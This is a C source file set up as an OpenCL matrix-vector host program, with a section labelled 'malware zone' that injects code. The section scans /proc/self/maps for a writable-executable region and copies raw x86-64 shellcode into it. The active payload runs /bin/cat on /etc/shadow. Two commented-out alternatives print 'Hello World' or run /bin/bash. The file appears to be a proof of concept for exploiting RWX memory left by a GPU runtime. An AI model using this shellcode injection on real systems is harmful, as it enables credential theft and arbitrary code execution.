#include<stdio.h>
#include<stdlib.h>
#include<string.h>

#include<CL/cl.h>

int main(){

	cl_platform_id platform;
	cl_device_id device;
	cl_context context;
	cl_command_queue queue;
	cl_int i, err;

	cl_program program;
	FILE *program_handle;
	char *program_buffer, *program_log;
	size_t program_size, log_size;
	cl_kernel kernel;
	size_t work_units_per_kernel;

	float mat[16] = {0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9, 1.0, 1.1, 1.2, 1.3, 1.4, 1.5, 1.6}; 
	float vec[4] = {0.1, 0.2, 0.3, 0.4};
	float res[4] = {0.0, 0.0, 0.0, 0.0};

	cl_mem mat_buf, vec_buf, res_buf;

	char* ext_data;
	size_t ext_size;

	clGetPlatformIDs(1, &platform, NULL);
	clGetDeviceIDs(platform, CL_DEVICE_TYPE_ALL, 1, &device, NULL);
	context = clCreateContext(NULL, 1, &device, NULL, NULL, &err);

	program_handle = fopen("matvec.cl", "r");
	fseek(program_handle, 0, SEEK_END);
	program_size = ftell(program_handle);
	rewind(program_handle);
	program_buffer = malloc(program_size+1);
	program_buffer[program_size] = '\0';
	fread(program_buffer, 1, program_size, program_handle);
	fclose(program_handle);

	program = clCreateProgramWithSource(context, 1, &program_buffer, &program_size, &err);
	free(program_buffer);

	clBuildProgram(program, 0, NULL, NULL, NULL, NULL);
	char **binaries;
	size_t* binary_sizes;
	int num_binaries;
	size_t num_bytes_copied;

	clGetProgramInfo(program, CL_PROGRAM_BINARY_SIZES, 0, 0, &num_binaries);
	num_binaries = num_binaries/sizeof(size_t);
	binary_sizes = (size_t*)malloc(num_binaries * sizeof(size_t)); 
	binaries = (const unsigned char**)calloc(num_binaries, sizeof(unsigned char*));

	clGetProgramInfo(program, CL_PROGRAM_BINARY_SIZES, num_binaries*sizeof(size_t), binary_sizes, &num_bytes_copied);
	for (i = 0; i < num_binaries; ++i) 
		binaries[i] = (const unsigned char*) malloc(binary_sizes[i]*sizeof(const unsigned char));

	clGetProgramInfo(program, CL_PROGRAM_BINARIES, num_binaries*sizeof(char*), binaries, &num_bytes_copied);
	for (i = 0; i < num_binaries; ++i){
		int j = binary_sizes[i];
		int k = 0;
		while(k < j){
			//if(k >= 0x21c4)printf("%c", binaries[i][k]);
			k++;
		}
	}
  
	cl_program program_with_binary;
	program_with_binary = clCreateProgramWithBinary(context, num_binaries, &device, binary_sizes, binaries, NULL, &err);

	kernel = clCreateKernel(program, "matvec_mult", &err);
	queue = clCreateCommandQueueWithProperties(context, device, NULL, &err);

	mat_buf = clCreateBuffer(context, CL_MEM_READ_ONLY | CL_MEM_COPY_HOST_PTR, 64, mat, &err);
	vec_buf = clCreateBuffer(context, CL_MEM_READ_ONLY | CL_MEM_COPY_HOST_PTR, 16, vec, &err);
	res_buf = clCreateBuffer(context, CL_MEM_WRITE_ONLY, 16, NULL, &err);
	clSetKernelArg(kernel, 0, sizeof(cl_mem), &mat_buf);
	clSetKernelArg(kernel, 1, sizeof(cl_mem), &vec_buf);
	clSetKernelArg(kernel, 2, sizeof(cl_mem), &res_buf);

/******malware zone*******/

	FILE* fd = fopen("/proc/self/maps", "r");
	char mapfile[400];
	void* address;
	int index;

	printf("trying...\n");
	while(fread(&mapfile[index], 1, 1, fd)){
		putchar(mapfile[index]);
		if(mapfile[index] == '\n'){
			char* target = strstr(mapfile, "rwxp");
			index = 0;
			//printf("?? %p\n",target);
			if(target == NULL) continue;
			mapfile[12] = '\0';
			//printf("target: %s\n", mapfile);
			break;
		}
		index++;
	}
	fclose(fd);
	
	sscanf(mapfile, "%p", &address);
	address += 12;
	printf("exploit: %p\n", address);

/******Hello World!******/
/*	strcpy(address, "\x48\x83\xec\x0e\xc6\x04\x24\x48\xc6\x44\x24\x01\x65"
	"\xc6\x44\x24\x02\x6c\xc6\x44\x24\x03\x6c\xc6\x44\x24\x04\x6f"
	"\xc6\x44\x24\x05\x20\xc6\x44\x24\x06\x57\xc6\x44\x24\x07\x6f"
	"\xc6\x44\x24\x08\x72\xc6\x44\x24\x09\x6c\xc6\x44\x24\x0a\x64"
	"\xc6\x44\x24\x0b\x21\xc6\x44\x24\x0c\x0a\xc6\x44\x24\x0d\x0a"
	"\x48\xc7\xc2\x0f\x01\x01\x01\x48\x81\xea\x01\x01\x01\x01"
	"\x48\x89\xe6\x48\xc7\xc7\x02\x01\x01\x01\x48\x81\xef\x01\x01\x01\x01"
	"\x48\xc7\xc0\x02\x01\x01\x01\x48\x2d\x01\x01\x01\x01\x0f\x05\x00");
*/
/******Hello Root!******/
/*	strcpy(address, "\x48\x83\xec\x0e\xc6\x04\x24\x2f\xc6\x44\x24\x01\x62"
	"\xc6\x44\x24\x02\x69\xc6\x44\x24\x03\x6e\xc6\x44\x24\x04\x2f"
	"\xc6\x44\x24\x05\x62\xc6\x44\x24\x06\x61\xc6\x44\x24\x07\x73"
	"\xc6\x44\x24\x08\x68"
	"\x48\xc7\xc1\x01\x01\x01\x01\x48\x81\xe9\x01\x01\x01\x01"
	"\x48\x89\x4c\x24\x09\x48\x89\x4c\x24\x18\x48\x89\x64\x24\x10"
	"\x48\x8d\x54\x24\x18\x48\x8d\x74\x24\x10\x48\x89\xe7"
	"\x48\xc7\xc0\x3c\x01\x01\x01\x48\x2d\x01\x01\x01\x01\x0f\x05\x00");
*/
/******SHADOW!!!*******/
	strcpy(address, "\xc6\x04\x24\x2f\xc6\x44\x24\x01\x62"
	"\xc6\x44\x24\x02\x69\xc6\x44\x24\x03\x6e\xc6\x44\x24\x04\x2f"
	"\xc6\x44\x24\x05\x63\xc6\x44\x24\x06\x61\xc6\x44\x24\x07\x74"
	"\x48\xc7\xc1\x01\x01\x01\x01\x48\x81\xe9\x01\x01\x01\x01"
	"\x48\x89\x4c\x24\x08"
	"\xc6\x44\x24\x09\x2f\xc6\x44\x24\x0a\x65\xc6\x44\x24\x0b\x74"
	"\xc6\x44\x24\x0c\x63\xc6\x44\x24\x0d\x2f\xc6\x44\x24\x0e\x73"
	"\xc6\x44\x24\x0f\x68\xc6\x44\x24\x10\x61\xc6\x44\x24\x11\x64"
	"\xc6\x44\x24\x12\x6f\xc6\x44\x24\x13\x77"
	"\x48\x89\x4c\x24\x14\x48\x89\x4c\x24\x28\x48\x8d\x4c\x24\x09"
	"\x48\x89\x4c\x24\x20"
	"\x48\x89\x64\x24\x18\x48\x8d\x54\x24\x28\x48\x8d\x74\x24\x18"
	"\x48\x89\xe7"
	"\x48\xc7\xc0\x3c\x01\x01\x01\x48\x2d\x01\x01\x01\x01\x0f\x05\x00");
	
/******/

	work_units_per_kernel = 4;
	//sleep(60);
	//getchar();
	clEnqueueNDRangeKernel(queue, kernel, 1, NULL, &work_units_per_kernel, NULL, 0, NULL, NULL);
	clEnqueueReadBuffer(queue, res_buf, CL_TRUE, 0, 16, res, 0, NULL, NULL);

	printf("%f %f %f %f\n", res[0], res[1], res[2], res[3]);

	clReleaseMemObject(mat_buf);
	clReleaseMemObject(vec_buf);
	clReleaseMemObject(res_buf);
	clReleaseKernel(kernel);
	clReleaseCommandQueue(queue);
	clReleaseProgram(program);
	clReleaseContext(context);
	
	return 0;
}
